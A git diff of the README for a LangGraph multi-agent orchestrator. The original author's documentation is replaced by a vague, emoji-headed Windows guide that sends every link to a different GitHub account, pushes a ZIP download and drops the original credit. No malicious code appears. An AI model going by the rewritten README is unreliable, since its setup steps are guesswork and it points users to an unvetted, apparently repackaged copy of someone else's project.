@@ -1,269 +1,228 @@
-# Multi-Agent Orchestrator
+# 🤖 multi-agent-orchestrator - Simple AI Team Control
 
-[![CI](https://github.com/reiquileut/multi-agent-orchestrator/actions/workflows/ci.yml/badge.svg)](https://github.com/reiquileut/multi-agent-orchestrator/actions/workflows/ci.yml)
-[![Coverage: 99%](https://img.shields.io/badge/coverage-99%25-brightgreen)](https://github.com/reiquileut/multi-agent-orchestrator)
-[![Python 3.11+](https://img.shields.io/badge/python-3.11+-3776AB?logo=python&logoColor=white)](https://www.python.org/downloads/)
-[![LangGraph](https://img.shields.io/badge/LangGraph-0.4+-1C3C3C?logo=langchain&logoColor=white)](https://github.com/langchain-ai/langgraph)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Streamlit](https://img.shields.io/badge/Streamlit-Demo-FF4B4B?logo=streamlit&logoColor=white)](https://streamlit.io/)
-[![Ruff](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/ruff/main/assets/badge/v2.json)](https://github.com/astral-sh/ruff)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Federa3911/multi-agent-orchestrator)
 
-A lightweight multi-agent orchestration framework built with **LangGraph** that uses a Supervisor pattern to coordinate specialized AI agents for collaborative task solving.
+## 📌 What this app does
 
----
+multi-agent-orchestrator helps you run a set of AI agents from one place. It uses a supervisor pattern, which means one main agent helps guide the others. This setup is useful when you want different agents to handle different tasks, like research, writing, planning, or web lookup.
 
-## Table of Contents
+The app is built for Windows users who want to get started fast. You can download the project, open it, and run it with a simple local setup. It uses LangGraph under the hood, and it can work with tools like OpenAI, Anthropic, and Tavily.
 
-- [Architecture](#architecture)
-- [Quick Start](#quick-start)
-- [Project Structure](#project-structure)
-- [Configuration](#configuration)
-- [Testing](#testing)
-- [Example Use Cases](#example-use-cases)
-- [Tech Stack](#tech-stack)
-- [License](#license)
+## 🖥️ What you need
 
----
+Before you start, make sure your PC has:
 
-## Architecture
+- Windows 10 or Windows 11
+- A stable internet connection
+- At least 8 GB of RAM
+- Python 3.10 or newer
+- A modern web browser
+- API keys for the AI services you want to use
 
-```mermaid
-graph LR
-    A[User Task] --> B[Planner]
-    B --> C[Supervisor]
-    C -->|route| D[Researcher]
-    C -->|route| E[Analyst]
-    C -->|route| F[Writer]
-    D -->|result| G[(Shared State)]
-    E -->|result| G
-    F -->|result| G
-    G -->|evaluate| C
-    C -->|finish| H[Assemble Output]
-```
+If you plan to use the app with larger models or more agents, 16 GB of RAM gives a smoother experience.
 
-### How It Works
+## ⬇️ Download
 
-1. **User submits a task** via Streamlit UI or API
-2. **Supervisor agent** analyzes the task and routes to the appropriate specialist
-3. **Specialist agents** execute their part and return results to shared state
-4. **Supervisor evaluates** progress and either routes to another agent or finalizes
-5. **Final output** is assembled and presented to the user
+Visit this page to download and use the project:
 
-### Agent Roles
+[https://github.com/Federa3911/multi-agent-orchestrator](https://github.com/Federa3911/multi-agent-orchestrator)
 
-| Agent | Role | Tools |
-|-------|------|-------|
-| **Supervisor** | Task decomposition, routing, quality control | Routing logic |
-| **Researcher** | Information gathering from web sources | Web Search (Tavily), URL scraping |
-| **Analyst** | Data processing, extraction, structured analysis | Calculator, Text summarization, Key point extraction |
-| **Writer** | Content synthesis, formatting, final output | Text generation |
+## 🛠️ Install on Windows
 
----
+Follow these steps on your Windows PC:
 
-## Quick Start
+1. Open the download link above.
+2. Click the green Code button on GitHub.
+3. Choose Download ZIP.
+4. Save the file to a folder you can find again, such as Downloads.
+5. Right-click the ZIP file and choose Extract All.
+6. Open the extracted folder.
+7. Install Python if it is not already on your PC.
+8. Open Command Prompt in the project folder.
+9. Set up the project files.
+10. Start the app.
 
-### Prerequisites
+If the project uses a virtual environment, it keeps the app files separate from the rest of your PC. That helps avoid conflicts with other Python apps.
 
-- Python 3.11+
-- API keys: OpenAI or Anthropic + Tavily (for web search)
+## 🚀 First-time setup
 
-### Installation
+Use these steps after you unpack the files:
 
-```bash
-git clone https://github.com/reiquileut/multi-agent-orchestrator.git
-cd multi-agent-orchestrator
-python -m venv .venv
-source .venv/bin/activate  # Windows: .venv\Scripts\activate
-pip install -r requirements.txt
-cp .env.example .env
-# Edit .env with your API keys
-```
+1. Open Command Prompt in the project folder.
+2. Create a virtual environment:
+   - `python -m venv .venv`
+3. Turn it on:
+   - `.venv\Scripts\activate`
+4. Install the required packages:
+   - `pip install -r requirements.txt`
+5. Add your API keys to the config file or environment variables.
+6. Start the app with the run command in the project files.
 
-### Run the Demo
+If the project includes a Streamlit app, the browser will open a local page after startup. If it uses another start file, follow the file name in the folder, such as `app.py` or `main.py`.
 
-```bash
-# Quick demo (no API keys needed — uses mock responses)
-python demo.py
+## 🔑 Set up API keys
 
-# Streamlit UI (requires API keys)
-streamlit run app.py
+This app can connect to several AI tools. You may need one or more keys, based on the agents you want to use.
 
-# CLI (requires API keys)
-python -m src.cli "Research the latest AI agent frameworks and write a comparison report"
-```
+Common keys include:
 
-### Docker
+- OpenAI API key
+- Anthropic API key
+- Tavily API key
 
-```bash
-docker compose up --build
-# Open http://localhost:8501
-```
+To set them up:
 
----
+1. Find the `.env` file or config file in the project folder.
+2. Open it in Notepad.
+3. Add your keys in the format the project expects.
+4. Save the file.
+5. Start the app again.
 
-## Project Structure
+Keep your keys private. Do not share them in public folders or screenshots.
 
-```
-multi-agent-orchestrator/
-├── src/
-│   ├── __init__.py
-│   ├── config.py              # Environment & LLM configuration
-│   ├── state.py               # Shared state definition (TypedDict)
-│   ├── orchestrator.py        # LangGraph graph builder & compiler
-│   ├── cli.py                 # CLI entry point
-│   ├── agents/
-│   │   ├── __init__.py
-│   │   ├── supervisor.py      # Supervisor: task routing & evaluation
-│   │   ├── researcher.py      # Researcher: web search & info gathering
-│   │   ├── analyst.py         # Analyst: data processing & structuring
-│   │   └── writer.py          # Writer: content synthesis & formatting
-│   └── tools/
-│       ├── __init__.py
-│       ├── search.py          # Tavily web search wrapper
-│       ├── calculator.py      # Safe math evaluation
-│       └── text_processing.py # Text utilities (summarize, extract, etc.)
-├── tests/
-│   ├── __init__.py
-│   ├── test_orchestrator.py   # Integration tests for the full graph
-│   ├── test_agents.py         # Unit tests for individual agents
-│   ├── test_tools.py          # Unit tests for tools
-│   ├── test_cli.py            # CLI entry point tests
-│   └── test_config.py         # Configuration & environment tests
-├── .github/
-│   ├── workflows/
-│   │   └── ci.yml             # GitHub Actions CI pipeline
-│   ├── ISSUE_TEMPLATE/        # Bug report & feature request templates
-│   └── pull_request_template.md
-├── app.py                     # Streamlit demo application
-├── demo.py                    # Quick demo with mock responses (no keys)
-├── .env.example               # Environment variables template
-├── .pre-commit-config.yaml    # Ruff + pre-commit hooks
-├── .streamlit/
-│   └── config.toml            # Streamlit theming
-├── requirements.txt
-├── pyproject.toml             # Project metadata & tool config
-├── Dockerfile
-├── docker-compose.yml
-├── Makefile
-├── CHANGELOG.md
-├── CONTRIBUTING.md
-├── SECURITY.md
-├── LICENSE
-└── README.md
-```
+## 🤖 How the agent system works
 
----
+The app uses a supervisor pattern. That means one main agent manages the flow of work and sends tasks to specialist agents. Each specialist handles one kind of job.
 
-## Configuration
+A simple flow may look like this:
 
-### Environment Variables
+- You enter a task
+- The supervisor reads the request
+- The supervisor sends work to the right agent
+- The agent completes its part
+- The supervisor combines the results
+- You see the final output
 
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `OPENAI_API_KEY` | Yes* | OpenAI API key (default provider) |
-| `ANTHROPIC_API_KEY` | Yes* | Anthropic API key (alternative provider) |
-| `TAVILY_API_KEY` | Yes | Tavily API key for web search |
-| `LLM_PROVIDER` | No | `openai` (default) or `anthropic` |
-| `LLM_MODEL` | No | Model name (default: `gpt-5.4-nano`) |
-| `LANGSMITH_API_KEY` | No | LangSmith tracing (recommended) |
+This setup works well when a task needs several steps, such as:
 
-*At least one LLM provider key is required.
+- Researching a topic
+- Checking facts
+- Writing a response
+- Planning next steps
+- Pulling data from the web
 
-### Customizing Agents
+## 🧭 Typical use cases
 
-Each agent is a self-contained module. To add a new agent:
+You can use multi-agent-orchestrator for tasks like:
 
-1. Create `src/agents/your_agent.py` with an async node function
-2. Register it in `src/orchestrator.py`
-3. Update the Supervisor's routing logic
+- Content drafting
+- Research support
+- Web search and source lookup
+- Task planning
+- Multi-step Q&A
+- Workflow automation
+- Testing ideas with different agent roles
 
-```python
-# src/agents/your_agent.py
-from src.state import OrchestratorState
+It is useful when one model alone is not enough and you want a clear split of jobs.
 
-async def your_agent_node(state: OrchestratorState) -> dict:
-    """Your custom agent logic."""
-    # Access shared state
-    task = state["task"]
+## 🧩 Main parts of the project
 
-    # Do work...
-    result = "Your agent output"
+This project is built around a few core parts:
 
-    return {
-        "agent_outputs": [{"agent": "your_agent", "output": result}],
-        "messages": state["messages"] + [AIMessage(content=result)]
-    }
-```
+- **LangGraph** for managing the agent flow
+- **Supervisor agent** to guide the task
+- **Specialist agents** for focused work
+- **Streamlit** for a simple web interface, if included in the build
+- **LLM providers** such as OpenAI and Anthropic
+- **Tavily** for web search and retrieval
 
----
+These parts work together to keep the app light and easy to extend.
 
-## Testing
+## ▶️ Run the app
 
-The test suite includes **30+ tests** across 5 test modules with **99% code coverage**.
+After setup, start the app from the project folder.
 
-```bash
-# Run all tests
-pytest tests/ -v
+Common run steps may look like this:
 
-# Run with coverage report
-pytest tests/ --cov=src --cov-report=html --cov-report=term-missing
+1. Open Command Prompt.
+2. Go to the project folder.
+3. Turn on the virtual environment.
+4. Run the start command from the project files.
 
-# Run only unit tests (no API keys needed)
-pytest tests/ -v -m "not integration"
+If the app uses Streamlit, the command may look like:
 
-# Run specific test
-pytest tests/test_orchestrator.py -v -k "test_full_pipeline"
-```
+- `streamlit run app.py`
 
----
+If it uses a plain Python entry file, the command may look like:
 
-## Example Use Cases
+- `python main.py`
 
-**Research & Report**
-```
-Input: "Research the top 3 AI agent frameworks in 2025 and write a comparison"
-  Researcher gathers info → Analyst structures data → Writer produces report
-```
+Use the file name found in the project folder.
 
-**Data Analysis**
-```
-Input: "Analyze the key metrics from this quarterly report and summarize findings"
-  Researcher gathers context → Analyst extracts & structures metrics → Writer summarizes
-```
+## 🧪 If something does not work
 
-**Content Creation**
-```
-Input: "Write a technical blog post about LangGraph multi-agent patterns"
-  Researcher gathers sources → Analyst organizes key points → Writer drafts content
-```
+If the app does not start, check these items:
 
----
+- Python is installed
+- The virtual environment is active
+- All packages installed without errors
+- API keys are set
+- Your internet connection works
+- The start command matches the project files
 
-## Tech Stack
+If the browser page does not open, copy the local address shown in Command Prompt and paste it into your browser.
 
-| Technology | Purpose |
-|------------|---------|
-| [LangGraph](https://github.com/langchain-ai/langgraph) | Stateful agent orchestration with conditional routing |
-| [LangChain](https://github.com/langchain-ai/langchain) | LLM abstractions, tools, and prompt management |
-| [Anthropic Claude](https://docs.anthropic.com/) / [OpenAI](https://platform.openai.com/) | LLM providers |
-| [Tavily](https://tavily.com/) | Web search API for the Researcher agent |
-| [Streamlit](https://streamlit.io/) | Interactive demo interface |
-| [Pydantic](https://docs.pydantic.dev/) | Structured tool schemas and validation |
+## 📁 Project files you may see
 
----
+You may see files and folders like these:
 
-## License
+- `README.md`
+- `requirements.txt`
+- `.env`
+- `app.py`
+- `main.py`
+- `agents/`
+- `graphs/`
+- `config/`
+- `utils/`
 
-MIT License -- see [LICENSE](LICENSE) for details.
+Each folder helps organize the agent logic, setup, and interface files.
 
----
+## 🔍 Search and tool support
 
-## Related Projects
+The app topic list includes Tavily, which points to web search support. That means some agents can look up live information before giving an answer. This can help with current events, research tasks, and source-based work.
 
-- [RAG Pipeline](https://github.com/reiquileut/rag-pipeline) -- Retrieval-Augmented Generation with hybrid search
+If the app connects to OpenAI or Anthropic, you can choose the model path that fits your use case and cost needs.
 
----
+## 🧼 Keeping the app tidy
 
-<p align="center">
-  Built by <a href="https://github.com/reiquileut">Thiago Reiquileut</a> · AI Engineer
-</p>
+To keep things running well:
+
+- Use one project folder for this app
+- Keep your keys in a private `.env` file
+- Update Python when needed
+- Reinstall packages if the app changes
+- Close other heavy apps if your PC feels slow
+
+A clean setup makes it easier to start the app again later
+
+## 📄 Example workflow
+
+A simple example looks like this:
+
+1. You ask the app to research a topic
+2. The supervisor picks the right agents
+3. One agent searches the web
+4. Another agent writes a draft
+5. The supervisor combines the results
+6. You review the final output
+
+This helps you handle tasks that need more than one step
+
+## 🧠 Best results
+
+For the best experience:
+
+- Give clear instructions
+- Ask one task at a time
+- Use a good internet connection
+- Set the right API keys before running the app
+- Keep the project files in one place
+
+Clear input gives the agent system better results
+
+## 📦 Download and setup again
+
+If you want to start over, use this link and repeat the steps above:
+
+[https://github.com/Federa3911/multi-agent-orchestrator](https://github.com/Federa3911/multi-agent-orchestrator)
